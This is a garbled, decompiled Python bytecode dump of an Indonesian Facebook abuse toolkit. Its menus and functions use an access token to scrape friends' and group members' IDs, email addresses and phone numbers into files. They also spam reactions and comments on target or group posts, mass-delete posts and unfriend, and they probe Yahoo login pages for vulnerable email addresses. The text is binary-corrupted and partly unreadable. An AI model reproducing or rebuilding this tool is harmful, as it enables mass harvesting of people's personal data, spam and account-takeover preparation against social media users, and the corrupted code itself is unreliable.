[1;91m[ [1;97mKembali [1;91m]i    s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   MailVuln.txtR+   s5   [1;91m[?] [1;97mStatus [1;91m:  [1;97mRed[[1;92ms   [1;97m]  Green[[1;92ms   [1;97m]s   
R]   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR   R¨   s$   "messages.ERROR_INVALID_USERNAME">.*s   [1;91m s"   "messages.ERROR_INVALID_USERNAME">s   [1;92m s   
[1;91m[+] [1;97mSelesais8   [1;91m[+] [1;97mTersimpan [1;91m:[1;97m MailVuln.txt(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R¿   Ru   R   RÒ   RÓ   R   R   R»   RÏ   RÐ   RÑ   R7   R:   R;   R<   R=   R?   R
   RJ   (   RO   t   filesRÁ   RÙ   R©   RÔ   R×   RÃ   RÚ   R[   RÛ   RÜ   RÝ   (    (    s   <Ahmad_Riswanto>RÍ     sl    	

	

	

c          C   s¯   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs   [1;37;40m1. Ambil ID temans&   [1;37;40m2. Ambil ID teman dari temans!   [1;37;40m3. Ambil ID member GRUPs   [1;37;40m4. Ambil Email temans)   [1;37;40m5. Ambil Email teman dari temans   [1;37;40m6. Ambil No HP temans)   [1;37;40m7. Ambil No HP teman dari temans   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t
   grab_pilih(   RO   (    (    s   <Ahmad_Riswanto>Rv   Ú  s*    	c          C   sï   t  d  }  |  d k r' d GHt   nÄ |  d k r= t   n® |  d k rS t   n |  d k ri t   n |  d k r t   nl |  d k r t   nV |  d	 k r« t   n@ |  d
 k rÁ t   n* |  d k r× t	   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R^   R_   R`   Ra   Ro   t   7R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R5   Rß   t   id_temant   idfrom_temant   id_member_grupR   t   emailfrom_temant   nomor_hpt   hpfrom_temanRc   (   t   cuih(    (    s   <Ahmad_Riswanto>Rß   ó  s,    








c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n¯Xyt  j d  t GHd d GHt	 j
 d	 |   } t j | j  } t d
  } t | d  } t d  d d GHx[ | d D]O } t j | d  | j | d d  d | d GHd | d GHd d GHqÜ Wd t t  GHd | GH| j   t d  t   Wn¨ t k
 rd GHt d  t   n t t f k
 r¸d GHt d  t   nV t k
 rët  j |  d GHt d  t   n# t	 j j k
 rd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs3   https://graph.facebook.com/me/friends?access_token=sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97mR+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RS   RP   s   
s   [1;92mNama[1;91m  :[1;97m RX   s   [1;92mID   [1;91m : [1;97ms'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   RE   RF   RG   RH   RI   R5   R   t   idtemanR   R
   R¢   RJ   Rv   t   KeyboardInterruptt   EOFErrorR2   t   removeRM   R   R   (   RO   R   R   t   save_idt   bzt   ah(    (    s   <Ahmad_Riswanto>Rá     sZ    	
		







c    	      C   s_  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nüXyt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt
 j d
 | d |   } t j | j  } t	 d  } t | d  } t d  d d GHx_ | d d D]O } t j | d  | j | d d  d | d GHd | d GHd d GHq\Wd t t  GHd | GH| j   t	 d  t   Wnu t k
 rd GHt	 d  t   nO t t f k
 r8d GHt	 d  t   n# t
 j j k
 rZd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m RX   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]s)   ?fields=friends.limit(5000)&access_token=sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97mR+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...t   friendsRS   RP   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mID   [1;91m : [1;97ms'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R2   Rv   R   t   idfromtemanR   R
   R¢   RJ   Ré   Rê   RM   R   R   (	   RO   t   idtRÜ   t   opR   R   t   save_idtRí   Rî   (    (    s   <Ahmad_Riswanto>Râ   G  sb    	

		





c    	      C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n+Xyt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d  } t | d  } t d  d d GHt
 j d | d |   } t j | j  } x[ | d D]O } t j | d  | j | d d  d | d GHd | d GHd d GHqXWd t t  GHd | GH| j   t	 d  t   Wn¨ t k
 rd GHt	 d  t   n t t f k
 r4d GHt	 d  t   nV t k
 rgt  j |  d GHt	 d  t   n# t
 j j k
 rd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs*   [1;91m[+] [1;92mID grup [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RX   s   [1;91m[!] Grup tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;97mSimpan File [1;97mext(file.txt) [1;91m: [1;97mR+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   https://graph.facebook.com/s%   /members?fields=name,id&access_token=RS   RP   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mID  [1;91m  :[1;97m s'   
[1;91m[+] [1;97mJumlah ID [1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R2   Rv   R   t   idmemR   R
   R¢   RJ   Ré   Rê   Rë   RM   R   R   (	   RO   RP   R   Rº   t   simgR¬   R»   R¸   R¼   (    (    s   <Ahmad_Riswanto>Rã   ~  sl    	

		







c          C   s[  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nøXyLt  j d  t GHd d GHt	 d	  } t
 j d
 |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d | d d |   } t j | j  } yM t j | d  | j | d d  d | d GHd | d GHd d GHWqÜ t k
 rsqÜ XqÜ Wd t t  GHd | GH| j   t	 d  t   Wn¨ t k
 rÕd GHt	 d  t   n t t f k
 rd GHt	 d  t   nV t k
 r4t  j |  d GHt	 d  t   n# t
 j j k
 rVd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâsC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms3   https://graph.facebook.com/me/friends?access_token=R+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RS   s   https://graph.facebook.com/RP   s   ?access_token=R   s   
s   [1;92mNama[1;91m  :[1;97m RX   s   [1;92mEmail[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Email[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R   t   emR   R
   R2   R¢   RJ   Rv   Ré   Rê   Rë   RM   R   R   (   RO   t   mailsR   RU   R©   R¼   RT   R   (    (    s   <Ahmad_Riswanto>R   º  sd    	
		







c          C   s¤  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nAXyÈt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d  } t
 j d
 | d |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d
 | d d |   }	 t j |	 j  }
 yM t j |
 d  | j |
 d d  d |
 d GHd |
 d GHd d GHWqXt k
 rïqXXqXWd t t  GHd | GH| j   t	 d  t   Wnu t k
 rQd GHt	 d  t   nO t t f k
 r}d GHt	 d  t   n# t
 j j k
 rd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m RX   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms   /friends?access_token=R+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RS   RP   R   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mEmail[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Email[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R2   Rv   R   t   emfromtemanR   R
   R¢   RJ   Ré   Rê   RM   R   R   (   RO   Rñ   RÜ   Rò   R÷   R   RU   R©   R¼   RT   R   (    (    s   <Ahmad_Riswanto>Rä   ñ  sl    	

		





c          C   sa  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nþXyRt  j d  t GHd d GHt	 d	  } d
 |  } t
 j |  } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d | d d |   } t j | j  } yM t j | d  | j | d d  d | d GHd | d GHd d GHWqâ t k
 ryqâ Xqâ Wd t t  GHd | GH| j   t	 d  t   Wn¨ t k
 rÛd GHt	 d  t   n t t f k
 rd GHt	 d  t   nV t k
 r:t  j |  d GHt	 d  t   n# t
 j j k
 r\d GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâsC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms3   https://graph.facebook.com/me/friends?access_token=R+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RS   s   https://graph.facebook.com/RP   s   ?access_token=Rf   s   
s   [1;92mNama[1;91m  :[1;97m RX   s   [1;92mNomor[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Nomor[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms!   
[1;91m[ [1;97mKembali [1;91m]s&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[!] Kesalahan terjadis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R   t   hpR   R
   R2   R¢   RJ   Rv   Ré   Rê   Rë   RM   R   R   (   RO   t   nomsRR   R   R   t   not   nRT   (    (    s   <Ahmad_Riswanto>Rå   -  sf    	

		







c          C   s¤  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nAXyÈt  j d  t GHd d GHt	 d	  } y> t
 j d
 | d |   } t j | j  } d | d GHWn' t k
 rñ d GHt	 d  t   n Xt	 d  } t
 j d
 | d |   } t j | j  } t | d  } t d  d d GHx¤ | d D] } t
 j d
 | d d |   }	 t j |	 j  }
 yM t j |
 d  | j |
 d d  d |
 d GHd |
 d GHd d GHWqXt k
 rïqXXqXWd t t  GHd | GH| j   t	 d  t   Wnu t k
 rQd GHt	 d  t   nO t t f k
 r}d GHt	 d  t   n# t
 j j k
 rd GHt   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs3   [1;91m[+] [1;92mMasukan ID Teman [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m RX   s   [1;91m[!] Belum bertemans!   
[1;91m[ [1;97mKembali [1;91m]sC   [1;91m[+] [1;92mSimpan File [1;97mext(file.txt) [1;91m: [1;97ms   /friends?access_token=R+   s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...RS   RP   Rf   s   
s   [1;92mNama[1;91m  :[1;97m s   [1;92mNomor[1;91m : [1;97ms)   
[1;91m[+] [1;97mJumlah Nomor[1;96m%ss1   [1;91m[+] [1;97mFile tersimpan [1;91m: [1;97ms&   [1;91m[!] Kesalahan saat membuat files   [1;91m[!] Terhentis   [1;91m[â] Tidak ada koneksi(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R2   Rv   R   t   hpfromtemanR   R
   R¢   RJ   Ré   Rê   RM   R   R   (   RO   Rñ   RÜ   Rò   Rú   R   RU   Rû   R¼   RT   R   (    (    s   <Ahmad_Riswanto>Ræ   e  sl    	

		





c          C   s¯   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs&   [1;37;40m1. Bot Reactions Target Posts$   [1;37;40m2. Bot Reactions Grup Posts"   [1;37;40m3. Bot Komen Target Posts    [1;37;40m4. Bot Komen Grup Posts   [1;37;40m5. Mass delete Posts)   [1;37;40m6. Terima permintaan pertemanans   [1;37;40m7. Hapus pertemanans   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t	   bot_pilih(   RO   (    (    s   <Ahmad_Riswanto>Rd   ¡  s*    	c          C   sï   t  d  }  |  d k r' d GHt   nÄ |  d k r= t   n® |  d k rS t   n |  d k ri t   n |  d k r t   nl |  d k r t   nV |  d	 k r« t   n@ |  d
 k rÁ t   n* |  d k r× t	   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R^   R_   R`   Ra   Ro   Rà   R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(
   R5   Rþ   t
   menu_reactt
   grup_reactt	   bot_koment
   grup_koment
   deletepostt   acceptt   unfriendR1   (   t   bots(    (    s   <Ahmad_Riswanto>Rþ   º  s,    








c          C   sª   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs   [1;37;40m1. [1;97mLikes   [1;37;40m2. [1;97mLoves   [1;37;40m3. [1;97mWows   [1;37;40m4. [1;97mHahas   [1;37;40m5. [1;97mSedihs   [1;37;40m6. [1;97mMarahs   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t   react_pilih(   RO   (    (    s   <Ahmad_Riswanto>Rÿ   Ü  s(    	c          C   sý   t  d  }  |  d k r' d GHt   nÒ |  d k rC d a t   n¶ |  d k r_ d a t   n |  d k r{ d	 a t   n~ |  d
 k r d a t   nb |  d k r³ d a t   nF |  d k rÏ d a t   n* |  d k rå t   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   t   LIKER^   t   LOVER_   t   WOWR`   t   HAHARa   t   SADRo   t   ANGRYR%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R5   R  t   tipet   reactRd   (   t   aksi(    (    s   <Ahmad_Riswanto>R  ô  s4    







c          C   s¦  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nCXt  j d  t GHd d GHt	 d	  } t	 d
  } yå t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d |   d | d  j d d  d t GHqí WHd t t t   GHt	 d  t   Wn' t k
 r¡d GHt	 d  t   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...t   feedRS   RP   s   /reactions?type=s   &access_token=s   [1;92m[[1;97mi
   s   
t    s   ... [1;92m] [1;97ms"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R   t   reaksiR   RK   R  R   R¦   R¢   Rd   R2   (   RO   t   idet   limitt   ohRî   RU   R   (    (    s   <Ahmad_Riswanto>R    s>    	#
	
!%

c          C   sª   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs   [1;37;40m1. [1;97mLikes   [1;37;40m2. [1;97mLoves   [1;37;40m3. [1;97mWows   [1;37;40m4. [1;97mHahas   [1;37;40m5. [1;97mSedihs   [1;37;40m6. [1;97mMarahs   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t   reactg_pilih(   RO   (    (    s   <Ahmad_Riswanto>R   >  s(    	c          C   sý   t  d  }  |  d k r' d GHt   nÒ |  d k rC d a t   n¶ |  d k r_ d a t   n |  d k r{ d	 a t   n~ |  d
 k r d a t   nb |  d k r³ d a t   nF |  d k rÏ d a t   n* |  d k rå t   n d |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R  R^   R	  R_   R
  R`   R  Ra   R  Ro   R  R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R5   R  R  t   reactgRd   (   R  (    (    s   <Ahmad_Riswanto>R  V  s4    







c          C   sà  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n}Xt  j d  t GHd d GHt	 d	  } t	 d
  } t
 j d | d |   } t j | j  } d | d GHyå t
 j d | d | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
 j d | d t d |   d | d  j d d  d t GHq'WHd t t t   GHt	 d  t   Wn' t k
 rÛd GHt	 d  t   n Xd  S(    NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs*   [1;91m[+] [1;92mID Grup [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RX   s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...R  RS   RP   s   https://graph.facebook.com/s   /reactions?type=s   [1;92m[[1;97mi
   s   
R  s   ... [1;92m] [1;97ms"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R   t
   reaksigrupR   RK   R  R   R¦   R¢   Rd   R2   (   RO   R  R  Rî   Rº   R  RU   R   (    (    s   <Ahmad_Riswanto>R  |  sD    	#
	
!%

c          C   sÅ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nbXt  j d  t GHd d GHd	 GHt	 d
  } t	 d  } t	 d  } | j
 d d  } yá t j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d } t j |  t j d | d | d |   d | d  j
 d d  d GHqWHd t t t   GHt	 d  t   Wn' t k
 rÀd GHt	 d  t   n Xd  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs=   [1;91m[!] [1;92mGunakan [1;97m'<>' [1;92mUntuk Baris Barus,   [1;91m[+] [1;92mID Target [1;91m:[1;97m s,   [1;91m[+] [1;92mKomentar  [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s   https://graph.facebook.com/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...R  RS   RP   s   /comments?message=s   &access_token=s   [1;92m[[1;97mi
   R  s   ... [1;92m]s"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R   RE   RF   RG   RH   RI   R   t   komenR   RK   R¦   R¢   Rd   R2   (   RO   R  t   kmR  Rl   RU   R¸   t   f(    (    s   <Ahmad_Riswanto>R  £  sD    	#
	
!!

c    
      C   sÿ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nXt  j d  t GHd d GHd	 GHt	 d
  } t	 d  } t	 d  } | j
 d d  } yt j d | d |   } t j | j  } d | d GHt j d | d | d |   } t j | j  } t d  d d GHxk | d d D][ } | d }	 t j |	  t j d |	 d | d |   d | d  j
 d d  d GHqJWHd  t t t   GHt	 d!  t   Wn' t k
 rúd" GHt	 d!  t   n Xd  S(#   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs=   [1;91m[!] [1;92mGunakan [1;97m'<>' [1;92mUntuk Baris Barus+   [1;91m[+] [1;92mID Grup  [1;91m:[1;97m s+   [1;91m[+] [1;92mKomentar [1;91m:[1;97m s(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s   <>s   
s%   https://graph.facebook.com/group/?id=s   &access_token=s<   [1;91m[[1;96mâ[1;91m] [1;92mNama grup [1;91m:[1;97m RX   s    https://graph.facebook.com/v3.0/s   ?fields=feed.limit(s   )&access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...R  RS   RP   s   https://graph.facebook.com/s   /comments?message=s   [1;92m[[1;97mi
   R  s   ... [1;92m]s"   [1;91m[+][1;97m Selesai [1;96ms!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] ID Tidak ditemukan(   R   R/   R0   RY   R3   R   R   RN   R4   R5   R   RE   RF   RG   RH   RI   R   t	   komengrupR   RK   R¦   R¢   Rd   R2   (
   RO   R  R  R  Rî   Rº   Rl   RU   R¸   R  (    (    s   <Ahmad_Riswanto>R  Ê  sJ    	#
	
!!

c          C   sõ  t  j d  yH t d d  j   }  t j d |   } t j | j  } | d } Wn7 t	 k
 r d GHt  j d  t
 j d  t   n Xt  j d  t GHd	 d
 GHd | GHt d  d	 d
 GHt j d |   } t j | j  } xí | d D]á } | d } d } t j d | d |   }	 t j |	 j  }
 y3 |
 d d } d | d  j d d  d d GHWqö t k
 rªd | d  j d d  d d GH| d 7} qö t j j k
 rÖd GHt d  t   qö Xqö Wd GHt d  t   d  S(    NR   s	   login.txtR   s+   https://graph.facebook.com/me?access_token=RX   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs)   [1;91m[+] [1;92mFrom [1;91m: [1;97m%ss?   [1;91m[+] [1;92mMulai menghapus postingan unfaedah[1;97m ...s0   https://graph.facebook.com/me/feed?access_token=RS   RP   i    s   https://graph.facebook.com/s   ?method=delete&access_token=t   errort   messages   [1;91m[[1;97mi
   s   
R  s   ...s   [1;91m] [1;95mGagals   [1;92m[[1;97ms   [1;92m] [1;96mTerhapuss   [1;91m[!] Koneksi Errors!   
[1;91m[ [1;97mKembali [1;91m]s   
[1;91m[+] [1;97mSelesai(   R   R/   R0   RY   RE   RF   RG   RH   RI   R3   R   R   RN   R4   R   R   t	   TypeErrorRM   R   R5   Rd   (   RO   t   namt   lolR\   t   asut   asusRl   RP   t   piroRR   t   okR  (    (    s   <Ahmad_Riswanto>R  ô  sJ    		
	
%!

c          C   sÍ  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } t
 j d
 | d |   } t j | j  } d t | d  k rã d GHt	 d  t   n  t d  d d GHxº | d D]® } t
 j d | d d d |   } t j | j  } d t |  k rd | d d GHd | d d d GHd d GHqd | d d GHd | d d d GHd d GHqWd GHt	 d  t   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs(   [1;91m[!] [1;92mLimit [1;91m:[1;97m s3   https://graph.facebook.com/me/friendrequests?limit=s   &access_token=s   []RS   s*   [1;91m[!] Tidak ada permintaan pertemanans!   
[1;91m[ [1;97mKembali [1;91m]s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s&   https://graph.facebook.com/me/friends/t   fromRP   s   ?access_token=R  s(   [1;91m[+] [1;92mNama  [1;91m:[1;97m RX   s(   [1;91m[+] [1;92mID    [1;91m:[1;97m s   [1;91m Gagals   [1;92m Berhasils   
[1;91m[+] [1;97mSelesai(   R   R/   R0   RY   R3   R   R   RN   R4   R5   RE   RF   RG   RH   RI   R¦   Rd   R   RK   (   RO   R  R   RÕ   R¼   t   gasRU   (    (    s   <Ahmad_Riswanto>R    sB    	


	#
c          C   sd  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   në Xt  j d  t GHd d GHt	 d	  d d GHd
 GHHy| t
 j d |   } t j | j  } xP | d D]D } | d } | d } t
 j d | d |   d | d | GHqÇ WWn7 t k
 r#n' t k
 rId GHt d  t   n Xd GHt d  t   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   [1;97mStop [1;91mCTRL+Cs3   https://graph.facebook.com/me/friends?access_token=RS   RX   RP   s*   https://graph.facebook.com/me/friends?uid=s   &access_token=s    [1;97m[[1;92mTerhapus[1;97m] s    => s   [1;91m[!] Terhentis!   
[1;91m[ [1;97mKembali [1;91m]s   
[1;91m[+] [1;97mSelesai(   R   R/   R0   RY   R3   R   R   RN   R4   R   RE   RF   RG   RH   RI   t   deletet
   IndexErrorRé   R5   Rd   (   RO   RÝ   Rk   R¼   R\   RP   (    (    s   <Ahmad_Riswanto>R  E  s@    	
	



c          C   s¬   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHHd GHHd GHHt	   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
   [1;97mâs   [1;37;40m1. Buat postingans   [1;37;40m2. Buat Wordlists   [1;37;40m3. Akun Checkers   [1;37;40m4. Lihat daftar grups   [1;37;40m5. Profile Guards   [1;97m  ->Coming soon<-s   [1;31;40m0. Kembali(
   R   R/   R0   RY   R3   R   R   RN   R4   t
   pilih_lain(   RO   (    (    s   <Ahmad_Riswanto>Re   k  s,    	c          C   sÃ   t  d  }  |  d k r' d GHt   n |  d k r= t   n |  d k rS t   nl |  d k ri t   nV |  d k r t   n@ |  d k r t   n* |  d	 k r« t   n d
 |  d GHt   d  S(   Ns   [1;91m-âº[1;97m R]   s   [1;91m[!] Jangan kosongR   R^   R_   R`   Ra   R%   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R5   R+  t   statusRÉ   t
   check_akunt   grupsayat   guardR1   (   t   other(    (    s   <Ahmad_Riswanto>R+    s$    






c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } | d
 k r¬ d GHt	 d  t
   n^ t j d | d |   } t j | j  } t d  d d GHd | d GHt	 d  t
   d  S(   NR   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i(   s
